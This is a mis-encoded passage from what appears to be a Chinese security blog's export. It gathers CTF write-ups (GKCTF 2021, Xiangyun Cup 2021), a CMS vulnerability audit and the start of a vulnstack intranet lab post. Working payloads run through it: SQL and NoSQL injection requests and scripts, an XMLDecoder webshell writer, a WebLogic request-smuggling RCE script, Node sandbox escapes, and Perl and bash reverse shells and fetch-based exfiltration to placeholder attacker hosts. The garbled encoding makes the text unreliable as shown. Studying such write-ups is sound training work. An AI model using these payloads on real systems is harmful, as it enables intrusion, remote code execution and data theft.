ï¼šä¸€å¼€å§‹çœ‹åˆ°è¿™ä¸ªé¦–é¡µsqlæ³¨å…¥è§‰å¾—å¾ˆå¥‡æ€ªï¼Œè·Ÿäº†ä¸€éæ‰å‘ç°è¿™ä¸ªåŠŸèƒ½åŸæœ¬çš„ç›®çš„æ˜¯åŒ¹é…é¡µé¢å†…å®¹ï¼ˆä¸çŸ¥é“å’‹å½¢å®¹ï¼‰ï¼Œåªæ˜¯æ²¡æœ‰è¿›è¡Œè¿‡æ»¤ï¼Œç›´æ¥æ’å…¥æ•°æ®åº“æ‰§è¡Œï¼Œå¯¼è‡´sqlæ³¨å…¥ã€‚ ä¸‰ã€ç•™è¨€ç•Œé¢sqlæ³¨å…¥ ä¸‹ä¸ªæ–­ç‚¹è·Ÿä¸€ä¸‹ èµ‹å€¼ å…³é”®åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬çš„ipå’Œç•™è¨€çš„ä¿¡æ¯ä¸€èµ·ä¼ å…¥ æœ€ç»ˆæ‰§è¡Œ å››ã€å‘å¸ƒæ–‡ç« sqlæ³¨å…¥è¿™ä¸ªä¼¼ä¹æ˜¯betaç‰ˆæœ¬çš„æ´ betaï¼š æ­£å¼ç‰ˆï¼š payload POST /user/release.html HTTP/1.1 Host: www.jizhi.com:1238 Content-Length: 221 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://www.jizhi.com:1238 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://www.jizhi.com:1238/user/release.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,ko;q=0.8 Cookie: PHPSESSID=216fp73bnjss25l5tnlqtb5bmt Connection: close id=&amp;isshow=&amp;molds=article&amp;tid=2&#39;and%20extractvalue(1,%20concat(0x5c,%20(select%20database()),0x5c))%20and%20%20&#39;1&#39;=&#39;1&amp;title=1&amp;keywords=1&amp;litpic=&amp;file_litpic=&amp;description=1&amp;submit=%E6%8F%90%E4%BA%A4&amp;body=%3Cp%3E1%3C%2Fp%3E v1.7ä¸€ã€wechatæ’ä»¶sqlæ³¨å…¥å¯¹ç€Seayçš„æŠ¥å‘Šå®¡äº†å‡ ä¸ªéƒ½æ— æœï¼Œè®°å¾—ä¹‹å‰çœ‹çš„æ–‡ç« æåˆ°wechatéƒ¨åˆ†å­˜åœ¨æ¼æ´ï¼Œäºæ˜¯ç›´æ¥è·³åˆ°Home/c/WechatController.phpã€‚ æ˜¾ç„¶è¿™é‡Œurlä¸å¯æ§ï¼Œæ‰€ä»¥ä¸å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ã€‚ä½†æ˜¯åœ¨ä¸Šä¸‹éƒ½æœ‰ä¸€ä¸ªMå‡½æ•°ï¼Œfindå’Œaddä¼¼ä¹æ˜¯å’Œæ•°æ®åº“äº¤äº’çš„è¯­å¥ï¼Œå‚æ•°é™¤äº†åŒ…å«ä¸å¯æ§çš„userå¤–è¿˜æœ‰ä¸€ä¸ªopenid å¾€ä¸Šçœ‹å¯çŸ¥openidæ˜¯å¯æ§çš„xmlå­—ç¬¦ä¸²ã€‚ æ³¨æ„æ ¼å¼ &lt;?xml version=&#39;1.0&#39;?&gt; &lt;Troy3e&gt; &lt;MsgType&gt;event&lt;/MsgType&gt; &lt;Event&gt;subscribe&lt;/Event&gt; &lt;FromUserName&gt;Troy3e&#39;&lt;/FromUserName&gt; &lt;/Troy3e&gt; äºŒã€å®‰è£…æ’ä»¶å¤„ä»»æ„æ–‡ä»¶ä¸Šä¼  é¦–å…ˆè¦çŸ¥é“çš„æ˜¯frparamè¿™ä¸ªå‡½æ•° æ‰€ä»¥å¯çŸ¥updateä¸­filepathã€actionã€download_urlç­‰éƒ½æ˜¯å¯æ§çš„ã€‚ç»§ç»­å¾€ä¸‹çœ‹ï¼Œå½“actionä¼ å…¥start-downloadæ—¶ï¼š å°±æ˜¯ä¸‹è½½download_urlçš„æ–‡ä»¶ï¼Œæ”¾åˆ°tmp_pathé‡Œï¼Œè€Œtmp_pathæ˜¯filepathç»„æˆçš„ï¼Œæ‰€ä»¥æ–‡ä»¶è·¯å¾„ä¹Ÿæ˜¯å¯æ§çš„ã€‚ä½†æ˜¯æˆ‘ä»¬ä¸èƒ½ç›´æ¥ä¸‹è½½phpæ–‡ä»¶ï¼Œæ—¢æ˜¯å› ä¸ºä¸çŸ¥é“æ˜¯å¦å…è®¸ä¸Šä¼ phpï¼Œæ›´é‡è¦çš„æ˜¯tmp_pathå¼ºåˆ¶åŠ äº†zipåç¼€ã€‚ å¯»æ‰¾ä¸€ä¸‹è§£å‹çš„åŠŸèƒ½ æˆåŠŸä¸Šä¼  è·¯å¾„ä¸ºï¼šhttp://www.jizhi.com:1238/A/exts/shell.php ä»»æ„æ–‡ä»¶å¤¹ä¸‹è½½ä¹Ÿæ˜¯frparamå‡½æ•°çš„åŸå› ï¼Œå¾ˆç®€å• åå°é…ç½®æ–‡ä»¶åˆ é™¤è¿˜æ˜¯frprarmçš„é—®é¢˜ã€‚ã€‚ã€‚ åªè¦åŒ…å«config.phpï¼Œå°±ä¼šæŠŠæ•´ä¸ªæ–‡ä»¶å¤¹åˆ é™¤ post path=../../Conf&amp;type=2","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"GKCTF 2021","slug":"GKCTF 2021","date":"2021-10-26T13:20:28.000Z","updated":"2021-10-26T15:44:41.637Z","comments":true,"path":"2021/10/26/GKCTF 2021/","link":"","permalink":"/2021/10/26/GKCTF 2021/","excerpt":"","text":"[GKCTF 2021]babycatåªèƒ½ç™»å½•ä¸èƒ½æ³¨å†Œï¼Œçœ‹ä¸€ä¸‹js ç›´æ¥å‘åŒ…æ³¨å†Œ uploadåŠŸèƒ½admin onlyï¼Œä½†æ˜¯è¿˜æœ‰ä¸ªdownloadï¼ŒæŠ“ä¸ªåŒ…çœ‹çœ‹èƒ½ä¸èƒ½ä»»æ„è¯» ç„¶åä¸çŸ¥é“è¯»å•¥äº†ï¼Œjavaä¸ç†Ÿï¼Œgã€‚æŸ¥çœ‹wpå¯çŸ¥è·¯å¾„æ˜¯è¿™æ ·çš„/home/download?file=../../WEB-INF/classes/com/web/servlet/registerServlet.class æ”¾åˆ°jd-guié‡Œé¢ ç®­å¤´1æ²¡ç”¨ï¼Œçœ‹åˆ°æ›¿æ¢ä¸‹æ„è¯†æ ‡äº†ã€‚ç®­å¤´2åŒ¹é…â€roleâ€:â€(.*?)â€ã€‚éè´ªå©ªåŒ¹é…ï¼Œåªä¼šåŒ¹é…ä¸€æ¬¡ã€‚ç®­å¤´3å°†åŒ¹é…åˆ°çš„roleå¼ºåˆ¶è½¬æ¢ä¸ºguestã€‚ è¿™é‡Œç”±äºæ˜¯jsonåº“ï¼Œå¹¶ä¸”æ˜¯gsonè¿›è¡Œè§£æï¼Œäºæ˜¯å¯ä»¥åœ¨ jsonä¸­ä½¿ç”¨æ³¨é‡Šç¬¦/**/ã€‚ç”¨æ³¨é‡Šç¬¦ç ´åæ­£åˆ™çš„åŒ¹é…ï¼š data={&quot;username&quot;:&quot;test3&quot;,&quot;password&quot;:&quot;test&quot;,&quot;role&quot;:&quot;admin&quot;,&quot;role&quot;/**/:&quot;admin&quot;} æˆåŠŸadmin æˆ‘çœ‹åˆ°å®˜æ–¹ç»™çš„payloadæ˜¯ æœ‰ç‚¹ä¸æ˜¯å¾ˆç†è§£ä¸ºä»€ä¹ˆåŒ¹é…çš„æ˜¯æœ€åä¸€ä¸ªã€‚ è¯»å–uploadServlet.class ç™½åå•åç¼€ï¼Œå¹¶ä¸”banäº†ä¸€äº›æ‰§è¡Œå‡½æ•°ï¼Œè¿™è®©æœ¬å°±ä¸ç†Ÿjavaçš„æˆ‘åŸåœ°å»ä¸–ã€‚ éé¢„æœŸç„¶è€Œè¿™é‡Œå¹¶æ²¡æœ‰å¯¹é”™è¯¯ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œå¤„ç† å°è¯•ç›´æ¥ä¼ shell é¢„æœŸ å…¶ä¸­ System.getenv(â€œCATALINA_HOMEâ€) å¯ä»¥ä½¿ç”¨å‰é¢çš„æ–‡ä»¶åŒ…å«è¯»å– /proc/self/environ å¾—åˆ°ä¸º /usr/local/tomcatã€‚å› æ­¤å¯ä»¥å°è¯•å°† db.xml è¦†ç›–ä¸ºæ¶æ„ä»£ç åä½¿ç”¨æ³¨å†Œä¸šåŠ¡è§¦å‘ XMLDecoder ååºåˆ—åŒ–ã€‚ ç½‘ä¸Šæ‰¾äº†æ‰§è¡Œçš„xmlç»“æ„ å› ä¸ºè¿™é‡Œæœ‰è¿‡æ»¤ï¼Œæ‰€ä»¥æ¢ç”¨hintä¸­æåˆ°çš„ PrintWriterï¼Œä¹Ÿå¯ä»¥ç”¨å®ä½“ç¼–ç ç»•è¿‡ã€‚ &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;java class=&quot;java.beans.XMLDecoder&quot;&gt; &lt;object class=&quot;java.io.PrintWriter&quot;&gt; &lt;string&gt;/usr/local/tomcat/webapps/ROOT/static/shell.jsp&lt;/string&gt; &lt;void method=&quot;println&quot;&gt; &lt;string&gt;&lt;![CDATA[å†°èçš„è½½è·]]&gt;&lt;/string&gt; &lt;/void&gt; &lt;void method=&quot;close&quot;/&gt; &lt;/object&gt; &lt;/java&gt; æ³¨é”€ç™»å½•è§¦å‘ [GKCTF 2021]easycmså¼±å£ä»¤ç™»é™†åå°ï¼Œå¯¼å‡ºæ¨¡æ¿å¤„å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½ã€‚ è¿˜æœ‰ä¸€ç§è§£æ³•ï¼Œæ˜¯åœ¨ä¸»é¢˜ç¼–è¾‘ç•Œé¢å¤„ ä½†æ˜¯æç¤º ä¸Šä¼ ç»„ä»¶ç´ æçš„åœ°æ–¹é€šè¿‡ä¿®æ”¹åç§°å¯å¯¼è‡´ç›®å½•ç©¿è¶Šåˆ›å»ºæ–‡ä»¶è‡³systemç›®å½•ï¼Œå› ä¸ºå®ƒçš„å­˜å‚¨è·¯å¾„ç›´æ¥æ’åœ¨åç§°åé¢ã€‚ åœ¨è®¾è®¡-é«˜çº§é‚£é‡Œæ”¹æ¨¡æ¿ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚ [GKCTF 2021]easynode waféƒ¨åˆ†ï¼Œå°†æ£€æµ‹åˆ°çš„é»‘åå•å†…çš„å­—ç¬¦æ›¿æ¢ä¸º*ã€‚ä½†æ˜¯ç”±äºéå†çš„æ—¶å€™å¯¹æ¯”çš„æ˜¯å…ƒç´ ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ã€‚ jsåˆ©ç”¨Stringå’ŒArrayç»•è¿‡ä¸€äº›é™åˆ¶ ï¼šhttps://www.cnblogs.com/lzc-smiling/p/15161644.html å½“ç„¶è¿™ç¯‡æ–‡ç« è¯´çš„å¹¶ä¸å®Œå…¨æ­£ç¡®ï¼Œå› ä¸ºè¿™é‡Œæ•°ç»„è½¬ä¸ºå­—ç¬¦ä¸²é çš„æ˜¯åŠ è¿ç®—ã€‚ï¼ˆè¿™ä¹Ÿæ˜¯åé¢payloadæœ€ååŠ *çš„åŸå› æœ€ç»ˆusernameä¸º [&quot;admin&#39; #&quot;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;*&#39;] payload username[]=admin&#39; #&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=*&amp;password=Troy3e æˆ–è€… username[]=admin&#39;#&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=a&amp;username[]=*&amp;username[]=a&amp;password=Troy3e *åªè¦åœ¨å•å¼•å·çš„ä½ç½®ä¹‹åå³å¯ã€‚ åœ¨adminDIVæ¨¡å—ä¼šè¯»å–ç”¨æˆ·çš„ç”¨æˆ·åï¼Œç„¶åå°†DIVçš„é”®åå’Œå€¼ç›´æ¥å¯¼å…¥è¿›å»ã€‚ç»“åˆejsçš„rceï¼šhttps://xz.aliyun.com/t/6113 å°±å¯ä»¥getshelläº†ã€‚ è·å– protoç”¨æˆ·çš„ token ï¼Œç”¨æ­¤ token å»POST data æ•°æ®æ±¡æŸ“ æµç¨‹ï¼šè·å–admin token -&gt; æ·»åŠ ç”¨æˆ· -&gt; å¯¼å…¥DIV -&gt; æ¸²æŸ“è§¦å‘ã€‚ perl -e &#39;use Socket;$i=&quot;x.x.x.x&quot;;$p=3333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39; [GKCTF 2021]CheckBotbotæœ¬åœ°è®¿é—®admin.phpè·å¾—flagã€‚æ ¹æ®index.phpçš„æç¤ºï¼Œbotä¼šè®¿é—®æˆ‘ä»¬postæäº¤çš„urlã€‚é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´æ„é€ ä¸€ä¸ªé¡µé¢è®©botæœ¬åœ°è®¿é—®admin.phpå¹¶å¸¦å‡ºflagå³å¯ã€‚ &lt;html&gt; &lt;body&gt; &lt;iframe id=&quot;flag&quot; src=&quot;http://127.0.0.1/admin.php&quot;&gt;&lt;/iframe&gt; &lt;script&gt; window.onload = function(){ /* Prepare flag */ let flag = document.getElementById(&quot;flag&quot;).contentWindow.document.getElementById(&quot;flag&quot;).innerHTML; /* Export flag */ var exportFlag = new XMLHttpRequest(); exportFlag.open(&#39;get&#39;, &#39;http://x.x.x.x:3333/flagis-&#39; + window.btoa(flag)); exportFlag.send(); } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; è¿™ä¸ªæ²¡æ‰“å‡ºï¼Œåº”è¯¥æ˜¯xmlrequestçš„é—®é¢˜ï¼Œæ¢äº†ä¸‹é¢é‚£ä¸ª &lt;html&gt; &lt;body&gt; &lt;iframe id=&quot;iframe1&quot; src=&quot;http://127.0.0.1/admin.php&quot;&gt;&lt;/iframe&gt; &lt;script&gt; function load(){ var iframe = document.getElementById(&quot;iframe1&quot;).contentWindow.document.getElementById(&quot;flag&quot;).innerHTML; console.log(iframe); fetch(&#39;http://xxx.xx.xxx.xx:5555&#39;, {method: &#39;POST&#39;, mode: &#39;no-cors&#39;, body: iframe}) } window.onload = load; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; fetch:https://www.jb51.net/html5/586989.html [GKCTF 2021]hackmenosqlæ³¨å…¥ï¼šhttps://whoamianony.top/2021/07/30/Web%E5%AE%89%E5%85%A8/Nosql%20%E6%B3%A8%E5%85%A5%E4%BB%8E%E9%9B%B6%E5%88%B0%E4%B8%80/ æ ¹æ®æç¤ºnosql ç»æµ‹è¯•regexpã€neç­‰è¢«banï¼Œç”¨unicodeç»•è¿‡ ç›²æ³¨ import requests import string import time flag = &quot;&quot; url = &quot;http://node4.buuoj.cn:27064/login.php&quot; while True: for i in string.printable: if i not in [&#39;*&#39;, &#39;+&#39;, &#39;.&#39;, &#39;?&#39;, &#39;|&#39;, &#39;#&#39;, &#39;&amp;&#39;, &#39;$&#39;]: data = &quot;&quot;&quot;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;\\\\u0024\\\\u0072\\\\u0065\\\\u0067\\\\u0065\\\\u0078&quot;:&quot;^%s&quot;}}&quot;&quot;&quot; % (flag + i) headers = {&#39;Content-Type&#39;: &#39;application/json&#39;} r = requests.post(url=url,headers=headers,data=data) if &#39;ç™»å½•äº†&#39; in r.content.decode(): flag += i print(flag) time.sleep(0.2) æˆ– import requests import string import time Troy3e = [&#39;0&#39;, &#39;1&#39;,&#39;2&#39;, &#39;3&#39;,&#39;4&#39;, &#39;5&#39;,&#39;6&#39;, &#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c &#39;,&#39;d&#39;, &#39;e&#39;,&#39;f&#39;, &#39;g&#39;,&#39;h&#39;, &#39;i&#39;, &#39;j&#39;,&#39;k&#39;, &#39;l&#39;, &#39;m&#39;,&#39;n&#39;, &#39;o&#39;, &#39;p&#39;,&#39;q&#39;, &#39;r&#39;,&#39;s &#39; , &#39;t&#39;, &#39;u &#39;,&#39;v&#39;, &#39;w&#39;, &#39;x &#39;, &#39;y&#39; ,&#39;z&#39;, &#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;, &#39;O&#39;,&#39;P&#39;, &#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W &#39;,&#39;X &#39;,&#39;Y&#39;,&#39;Z&#39;] flag = &quot;&quot; url = &quot;http://node4.buuoj.cn:27064/login.php&quot; while True: for i in Troy3e: data = &quot;&quot;&quot;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;\\\\u0024\\\\u0072\\\\u0065\\\\u0067\\\\u0065\\\\u0078&quot;:&quot;^%s&quot;}}&quot;&quot;&quot; % (flag + i) headers = {&#39;Content-Type&#39;: &#39;application/json&#39;} r = requests.post(url=url,headers=headers,data=data) if &#39;ç™»å½•äº†&#39; in r.content.decode(): flag += i print(flag) time.sleep(0.2) 42276606202db06ad1f29ab6b4a1307fæ ¹æ®æç¤ºè¯»nginxé…ç½®æ–‡ä»¶ worker_processes 1; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; server { listen 80; error_page 404 404.php; root /usr/local/nginx/html; index index.htm index.html index.php; location ~ \\.php$ { root /usr/local/nginx/html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; include fastcgi_params; } } resolver 127.0.0.11 valid=0s ipv6=off; resolver_timeout 10s; # weblogic server { listen 80; server_name weblogic; location / { proxy_set_header Host $host; set $backend weblogic; proxy_pass http://$backend:7001; } } } fastcgiæ²¡æœ‰æš´éœ²åœ¨å…¬ç½‘ï¼Œæ²¡æ³•æœªæˆæƒã€‚å†…ç½‘æœ‰ä¸ªweblogicã€‚ä½†æ˜¯æ²¡æ³•SSRFï¼Œè¿™æ—¶æ³¨æ„åˆ°é¶æœºçš„nginxç‰ˆæœ¬ å­˜åœ¨è¯·æ±‚èµ°ç§ åé¢æ²¡å¤ç°æˆï¼Œç›´æ¥æ‹¿äº†ç°æˆè„šæœ¬æ‰“ import socket sSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sSocket.connect((&quot;node4.buuoj.cn&quot;, 27064)) payload = b&#39;&#39;&#39;HEAD / HTTP/1.1\\r\\nHost: node4.buuoj.cn\\r\\n\\r\\nGET /console/css/%252e%252e%252fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(%27weblogic.work.ExecuteThread%20currentThread%20=%20(weblogic.work.ExecuteThread)Thread.currentThread();%20weblogic.work.WorkAdapter%20adapter%20=%20currentThread.getCurrentWork();%20java.lang.reflect.Field%20field%20=%20adapter.getClass().getDeclaredField(%22connectionHandler%22);field.setAccessible(true);Object%20obj%20=%20field.get(adapter);weblogic.servlet.internal.ServletRequestImpl%20req%20=%20(weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(%22getServletRequest%22).invoke(obj);%20String%20cmd%20=%20req.getHeader(%22cmd%22);String[]%20cmds%20=%20System.getProperty(%22os.name%22).toLowerCase().contains(%22window%22)%20?%20new%20String[]{%22cmd.exe%22,%20%22/c%22,%20cmd}%20:%20new%20String[]{%22/bin/sh%22,%20%22-c%22,%20cmd};if(cmd%20!=%20null%20){%20String%20result%20=%20new%20java.util.Scanner(new%20java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(%22\\\\\\\\A%22).next();%20weblogic.servlet.internal.ServletResponseImpl%20res%20=%20(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(%22getResponse%22).invoke(req);res.getServletOutputStream().writeStream(new%20weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();}%20currentThread.interrupt(); HTTP/1.1\\r\\nHost:weblogic\\r\\ncmd: /readflag\\r\\n\\r\\n&#39;&#39;&#39; sSocket.send(payload) sSocket.settimeout(2) response = sSocket.recv(2147483647) while len(response) &gt; 0: print(response.decode()) try: response = sSocket.recv(2147483647) except: break sSocket.close()","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"ç¥¥äº‘æ¯2021 Web","slug":"2021ç¥¥äº‘æ¯-Package-Manager-2021","date":"2021-10-21T04:52:31.000Z","updated":"2021-10-21T09:26:24.962Z","comments":true,"path":"2021/10/21/2021ç¥¥äº‘æ¯-Package-Manager-2021/","link":"","permalink":"/2021/10/21/2021ç¥¥äº‘æ¯-Package-Manager-2021/","excerpt":"","text":"[2021ç¥¥äº‘æ¯]Package Manager 2021è™½ç„¶è¿˜æ˜¯çœ‹ä¸å¤ªæ‡‚è¿™ç§jsï¼Œä½†æ˜¯ä¸å½±å“åšé¢˜ã€‚ æ ¹æ®ç»éªŒå…ˆçœ‹routesé‡Œçš„index.tsã€‚å‘ç°authå¤„å­˜åœ¨å­—ç¬¦ä¸²çš„æ‹¼æ¥ï¼š è·Ÿè¿›checkmd5Regex æ²¡æœ‰åŒ¹é…å¼€å¤´ç»“å°¾ï¼Œä¹Ÿå°±æ˜¯åœ¨åé¢æ‹¼æ¥å†…å®¹å°±å¯ä»¥è¿‡æ­£åˆ™ã€‚ å†™ä¸ªè„šæœ¬è·‘å°±è¡Œã€‚ ffffffffffffffffffffffffffffffff&quot;||this.password[0]==&quot;! [2021ç¥¥äº‘æ¯]secrets_of_adminç”¨database.tsé‡Œç»™çš„adminç™»å½• è¿›å»æ˜¯ä¸ªåˆ›å»ºpdfçš„åŠŸèƒ½æ‰¾ä¸€ä¸‹ç›¸å…³ä»£ç ï¼š ç»§ç»­å¾€ä¸‹çœ‹ï¼Œæ˜¯ä¸€ä¸ªè¯»å–æ–‡ä»¶çš„æ¥å£ï¼š ä½†æ˜¯superuserè¢«ç¦ç”¨äº† è€Œflagå°±æ˜¯superuserçš„ æ‰€ä»¥éœ€è¦æŠŠflagç»™adminï¼Œä¹Ÿå°±æ˜¯ç»™adminä¸€ä¸ªæ–‡ä»¶åï¼Œè®©ä»–æ–‡ä»¶åä¸æ˜¯flagï¼Œå’Œè·¯å¾„æ‹¼æ¥åˆ°ä¸€èµ·æ—¶åˆå¯ä»¥è¯»åˆ°flagæ–‡ä»¶ï¼Œæ¯”å¦‚./flagã€‚å¯/api/filesé‚£é‡Œåˆéœ€è¦æœ¬åœ°è®¿é—®ï¼Œæ‰€ä»¥éœ€è¦ssrfã€‚ä¸ç†Ÿæ‚‰pdfè¿™é‡Œçš„ssrfï¼Œgoogleæ‰¾åˆ°äº† CVE-2019-15138 &lt;script&gt; var Troy3e = new XMLHttpRequest();Troy3e.open(&quot;GET&quot;, &quot;http://127.0.0.1:8888/api/files?username=admin&amp;filename=./flag&amp;checksum=123&quot;, true);Troy3e.send(); &lt;/script&gt; è¿‡æ»¤äº†å°æ ‡ç­¾å’Œscriptï¼Œç”¨æ•°ç»„ç»•è¿‡ æœ€åè®¿é—®/api/files/123ã€‚ [2021ç¥¥äº‘æ¯]cralwer_zindexæ˜¯æ™®é€šçš„æ³¨å†Œç™»å½•ï¼Œæ²¡æœ‰åˆ©ç”¨ç‚¹ã€‚ user.jsæœ‰profileã€verifyã€bucketä¸‰ä¸ªè·¯ç”±ã€‚ bucketè¿™é‡Œä¼šè®¿é—®user.bucketï¼Œå¤§æ¦‚è¿™å°±æ˜¯åˆ©ç”¨ç‚¹äº†ã€‚é¦–å…ˆå¿…é¡»æ»¡è¶³å¦‚ä¸‹è¦æ±‚ è·Ÿä¸€ä¸‹çœ‹çœ‹æ˜¯ä¸æ˜¯å¯æ§çš„ã€‚ æ˜¾ç„¶æˆ‘ä»¬è¦æ»¡è¶³ç¬¬ä¸€ä¸ªè¦æ±‚æ˜¯å¾ˆå®¹æ˜“çš„ï¼Œä½†è¿™é‡Œä¸è¡Œï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œä¸ä¼šè·³è½¬ã€‚ä½†æ˜¯åªæœ‰è·³è½¬åˆ°verifyæ‰ä¼šæ›´æ–°bucketã€‚ åŒæ—¶ï¼Œå‘åˆ°verifyçš„tokenä¼šå¤±æ•ˆã€‚è¿™è¯´æ˜æˆ‘ä»¬æ—¢è¦æ»¡è¶³personalbucketæ˜¯æˆ‘ä»¬è‡ªå·±çš„urlï¼Œä¹Ÿè¦èƒ½æ»¡è¶³è·³è½¬åˆ°verifyæˆåŠŸæ›´æ–°bucketã€‚ æ‰€ä»¥æˆ‘ä»¬å…ˆç”¨é»˜è®¤çš„bucketå‘ä¸€æ¬¡è¯·æ±‚è·å–åˆ°å¯ä»¥è¢«æ‰¾åˆ°çš„token å†ç”¨è‡ªå·±çš„urlå‘ä¸€æ¬¡åŒ… æœ€ååœ¨ç¬¬ä¸€æ¬¡å‘çš„åŒ…é‚£é‡Œé‡å®šå‘å³å¯æ›´æ–°bucketï¼Œè®¿é—®/user/bucketå³å¯åå¼¹shellã€‚ è¯»flag &lt;script&gt; a=this.constructor.constructor.constructor.constructor(&#39;return process&#39;)();b=a.mainModule.require(&#39;child_process&#39;);c=b.execSync(&#39;cat /flag&#39;).toString();document.write(c); &lt;/script&gt; å¼¹shell &lt;script&gt;c=&#39;constructor&#39;;this[c][c](&quot;c=&#39;constructor&#39;;require=this[c][c](&#39;return process&#39;)().mainModule.require;var sync=require(&#39;child_process&#39;).spawnSync; var ls = sync(&#39;bash&#39;, [&#39;-c&#39;,&#39;bash -i &gt;&amp; /dev/tcp/x.x.x.x/3333 0&gt;&amp;1&#39;],);console.log(ls.output.toString());&quot;)()&lt;/script&gt;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"vulnstackå†…ç½‘é¶åœº(äºŒ)","slug":"vulnstackå†…ç½‘é¶åœº-äºŒ","date":"2021-10-16T08:32:04.000Z","updated":"2021-10-16T12:09:59.867Z","comments":true,"path":"2021/10/16/vulnstackå†…ç½‘é¶åœº-äºŒ/","link":"","permalink":"/2021/10/16/vulnstackå†…ç½‘é¶åœº-äºŒ/","excerpt":"","text":"è¿™æ¬¡å°±ä¸å†™ä¿å§†çº§æ•™ç¨‹äº†ï¼Œå¤ªç´¯äº†ã€‚è€å®è¯´è¿™äº›é¶åœºå…¶å®å­¦ä¸åˆ°ä»€ä¹ˆæŠ€æœ¯ï¼Œåªæ˜¯ç”¨æ¥ç»ƒä¹ ä½¿ç”¨å„ç§å·¥å…·ã€‚é¶åœºé“¾æ¥ï¼šhttp://vulnstack.qiyuanxuetang.net/vuln/detail/3/ ç¯å¢ƒæ­å»ºç½‘ç»œæ‹“æ‰‘å›¾ ç½‘å¡ kaliï¼š WEBã€PCï¼š DCï¼š è‹¥Webå¯†ç é”™è¯¯çš„ï¼Œåœ¨å¿«ç…§ç®¡ç†å™¨é‡Œé¢é€‰æ‹©è½¬åˆ°1.3å³å¯ã€‚æ‰‹åŠ¨å¼€å¯WebæœåŠ¡ï¼Œä¾æ¬¡ç®¡ç†å‘˜æ‰§è¡Œè´¦å·ä¸ºadministratorï¼Œå¯†ç ä¸º1qaz@WSXã€‚ æ‰“å¼€webæœåŠ¡ï¼Œéœ€è¦ç®¡ç†å‘˜æƒé™ pingä¸€ä¸‹ï¼š æ­å»ºå®Œæˆã€‚ å¤–ç½‘æ¸—é€nmapæ”¶é›†ä¸€æ³¢ä¿¡æ¯ï¼Œæ‰«åˆ°äº†7001ï¼Œå®ä¹ çš„æ—¶å€™ç ”ç©¶è¿‡weblogicï¼Œæ‰€ä»¥ç›´æ¥è®¿é—®åå°ã€‚ http://192.168.111.80:7001/console/login/LoginForm.jsp WebLogic 10.3.6.0ï¼Œåº·åº·å·¥ä½œæ—¶å€™çš„è®°å½•ï¼š cve-2019-2725 å…ˆè¿æ¥å†°èï¼Œè¯´åˆ°è¿™ä¸å¾—ä¸åæ§½ä¸€ä¸‹javaï¼Œå†°èå’Œburpçš„javaç¯å¢ƒè¦æ±‚ä¸ä¸€æ ·å¯¼è‡´è¦æ¢æ¥æ¢å»ã€‚ 